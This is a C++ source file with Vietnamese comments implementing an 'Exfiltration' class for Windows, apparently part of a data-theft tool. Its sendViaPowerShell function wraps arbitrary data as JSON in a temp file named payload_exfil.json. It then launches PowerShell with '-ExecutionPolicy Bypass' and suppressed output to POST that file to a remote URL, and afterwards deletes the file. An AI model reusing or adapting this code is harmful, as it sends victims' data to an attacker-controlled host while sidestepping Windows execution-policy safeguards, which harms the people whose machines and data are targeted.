// Định nghĩa này dùng để tắt các cảnh báo về bảo mật của CRT (C Runtime Library) trên Visual Studio.
// Một số hàm cũ hơn trong CRT có thể bị coi là không an toàn và trình biên dịch sẽ cảnh báo.
// Việc định nghĩa _CRT_SECURE_NO_WARNINGS sẽ bỏ qua các cảnh báo này.
#define _CRT_SECURE_NO_WARNINGS

// Cần thiết cho hàm SHGetKnownFolderPath (để lấy đường dẫn thư mục đặc biệt của Windows).
// Mặc dù không được sử dụng trực tiếp trong hàm sendViaPowerShell này, nó có thể cần cho các phần khác.
#include <shlobj.h>

// Include header của lớp Exfiltration, chứa khai báo của lớp này.
#include "exfiltration.h"

// Include header Utils.h, có thể chứa các hàm tiện ích.
#include "utils.h"

// Cần thiết cho việc xuất dữ liệu ra console (std::cout, std::cerr).
#include <iostream>

// Cần thiết cho std::ostringstream, một lớp stream hoạt động trên chuỗi trong bộ nhớ,
// rất hữu ích để xây dựng các chuỗi phức tạp một cách có cấu trúc.
#include <sstream>

// Cần thiết cho std::ofstream, dùng để ghi dữ liệu vào file.
#include <fstream>

// Header chính của Windows API, chứa các định nghĩa và khai báo cơ bản.
#include <windows.h>
#include <string> // Nên include tường minh khi sử dụng std::string dù các header khác có thể đã kéo vào

// Constructor của lớp Exfiltration.
Exfiltration::Exfiltration() {
    std::cout << "[*] Exfiltration initialized\n";
}

// Destructor của lớp Exfiltration.
Exfiltration::~Exfiltration() {
    std::cout << "[*] Exfiltration destroyed\n";
}

// Hàm gửi dữ liệu (inputData) đến một URL (targetUrl) sử dụng PowerShell.
// Dữ liệu được đóng gói thành JSON payload trước khi gửi.
void Exfiltration::sendViaPowerShell(const std::string& inputData, const std::string& targetUrl) {
    // --- Bước 1: Escape dữ liệu đầu vào để tạo chuỗi JSON hợp lệ ---
    std::string escapedInput;
    escapedInput.reserve(inputData.length()); // Ước lượng kích thước để tránh cấp phát lại bộ nhớ nhiều lần

    for (char c : inputData) {
        switch (c) {
        case '\"': escapedInput += "\\\""; break; // Escape dấu ngoặc kép
        case '\\': escapedInput += "\\\\"; break; // Escape dấu gạch chéo ngược
        case '\b': escapedInput += "\\b";  break; // Escape ký tự backspace
        case '\f': escapedInput += "\\f";  break; // Escape ký tự form feed
        case '\n': escapedInput += "\\n";  break; // Escape ký tự xuống dòng mới (newline)
        case '\r': escapedInput += "\\r";  break; // Escape ký tự carriage return
        case '\t': escapedInput += "\\t";  break; // Escape ký tự tab
        default:   escapedInput += c;      break; // Giữ nguyên các ký tự khác
        }
    }

    // Tạo chuỗi JSON payload. Dữ liệu đã escape được đặt trong trường "content".
    // Ví dụ: {"content": "dữ liệu đã được escape"}
    std::string jsonPayload = "{\"content\": \"" + escapedInput + "\"}";

    // --- Bước 2: Ghi JSON payload vào một file tạm ---

    // Lấy đường dẫn đến thư mục TEMP của hệ thống.
    // std::getenv trả về con trỏ tới giá trị của biến môi trường, hoặc nullptr nếu không tồn tại.
    const char* tempEnvVar = std::getenv("TEMP");
    if (tempEnvVar == nullptr) {
        std::cerr << "[Lỗi] Không thể truy cập biến môi trường TEMP.\n";
        return; // Thoát khỏi hàm nếu không lấy được TEMP path
    }
    std::string tempPath = tempEnvVar;

    // Tạo đường dẫn đầy đủ đến file tạm (ví dụ: C:\Users\YourUser\AppData\Local\Temp\payload.json).
    // Sử dụng một tên file ít khả năng trùng lặp hơn có thể tốt hơn trong thực tế.
    std::string tempFilePath = tempPath + "\\payload_exfil.json";

    // Mở file tạm để ghi. `std::ios::out` là chế độ ghi, `std::ios::trunc` sẽ xóa nội dung file nếu đã tồn tại.
    std::ofstream tempFileStream(tempFilePath, std::ios::out | std::ios::trunc);
    if (!tempFileStream.is_open()) {
        std::cerr << "[Lỗi] Không thể mở hoặc tạo file tạm: " << tempFilePath << "\n";
        return; // Thoát khỏi hàm nếu không mở được file
    }

    // Ghi JSON payload vào file tạm.
    tempFileStream << jsonPayload;
    tempFileStream.close(); // Đóng file sau khi ghi xong.

    std::cout << "[Thông tin] JSON payload đã được ghi vào: " << tempFilePath << "\n";
    // std::cout << "Nội dung JSON: " << jsonPayload << "\n"; // Bỏ comment nếu muốn xem nội dung JSON

    // --- Bước 3: Xây dựng và thực thi lệnh PowerShell để gửi file ---

    // Sử dụng std::ostringstream để xây dựng chuỗi lệnh PowerShell một cách linh hoạt và dễ đọc hơn.
    std::ostringstream powershellCommandStream;

    // `powershell.exe`: Chương trình thực thi PowerShell.
    // `-ExecutionPolicy Bypass`: Tạm thời bỏ qua Execution Policy của hệ thống cho phiên này.
    // `-NoProfile`: Không tải profile của người dùng PowerShell (tăng tốc và tránh script không mong muốn).
    // `-NonInteractive`: Chạy ở chế độ không tương tác, không yêu cầu input từ người dùng.
    // `-Command "..."`: Thực thi chuỗi lệnh được cung cấp. Toàn bộ lệnh PowerShell nên nằm trong cặp dấu ngoặc kép này.
    powershellCommandStream << "powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command \"";

    // Bên trong lệnh PowerShell:
    // 1. Thiết lập SecurityProtocol thành Tls12:
    //    Đảm bảo kết nối sử dụng TLS 1.2, giao thức bảo mật hiện đại được nhiều máy chủ yêu cầu.
    //    Sử dụng dấu nháy đơn ' ' cho chuỗi trong PowerShell để tránh xung đột với dấu nháy kép " " của -Command.
    powershellCommandStream << "[System.Net.ServicePointManager]::SecurityProtocol = 'Tls12'; ";

    // 2. Tắt thanh tiến trình của Invoke-RestMethod để không hiển thị output không cần thiết:
    powershellCommandStream << "$ProgressPreference = 'SilentlyContinue'; ";

    // 3. Đọc nội dung file JSON tạm vào biến $body:
    //    `Get-Content -Raw`: Đọc toàn bộ file thành một chuỗi duy nhất.
    //    `-Path ('" << tempFilePath << "')`: Đường dẫn đến file. Đặt trong ('...') để xử lý nếu đường dẫn có khoảng trắng.
    //    Lưu ý: Để an toàn tuyệt đối, tempFilePath nếu chứa ký tự đặc biệt của PowerShell cần được escape thêm.
    //    Tuy nhiên, đường dẫn TEMP thường không chứa các ký tự này.
    powershellCommandStream << "$body = Get-Content -Raw -Path ('" << tempFilePath << "'); ";

    // 4. Gửi HTTP POST request bằng Invoke-RestMethod:
    //    `-Uri ('" << targetUrl << "')`: URL đích để gửi dữ liệu.
    //    `-Method POST`: Phương thức HTTP là POST.
    //    `-Body $body`: Nội dung của request là chuỗi JSON trong biến $body.
    //    `-ContentType 'application/json'`: Thông báo cho server biết nội dung gửi đi là JSON.
    powershellCommandStream << "Invoke-RestMethod -Uri ('" << targetUrl << "') ";
    powershellCommandStream << "-Method POST -Body $body -ContentType 'application/json';";

    // Kết thúc chuỗi lệnh PowerShell.
    powershellCommandStream << "\"";

    std::string powershellFullCommand = powershellCommandStream.str();
    std::cout << "[Thông tin] Đang thực thi lệnh PowerShell:\n" << powershellFullCommand << "\n";

    // Thực thi câu lệnh PowerShell.
    // system() sẽ chạy lệnh trong một tiến trình command prompt (cmd.exe) mới.
    // Cửa sổ cmd/powershell có thể nháy lên trong giây lát.
    int executionResult = system(powershellFullCommand.c_str());

    // --- Bước 4: Kiểm tra kết quả và dọn dẹp ---
    if (executionResult == 0) {
        std::cout << "[Thành công] Dữ liệu đã được gửi đi thành công.\n";
    }
    else {
        std::cerr << "[Lỗi] Có lỗi xảy ra trong quá trình thực thi lệnh PowerShell. Mã lỗi: " << executionResult << "\n";
    }

    // Xóa file JSON tạm sau khi đã sử dụng xong để dọn dẹp.
    if (DeleteFileA(tempFilePath.c_str()) != 0) {
        std::cout << "[Thông tin] File tạm " << tempFilePath << " đã được xóa.\n";
    }
    else {
        std::cerr << "[Cảnh báo] Không thể xóa file tạm: " << tempFilePath << ". Lỗi Windows: " << GetLastError() << "\n";
    }
}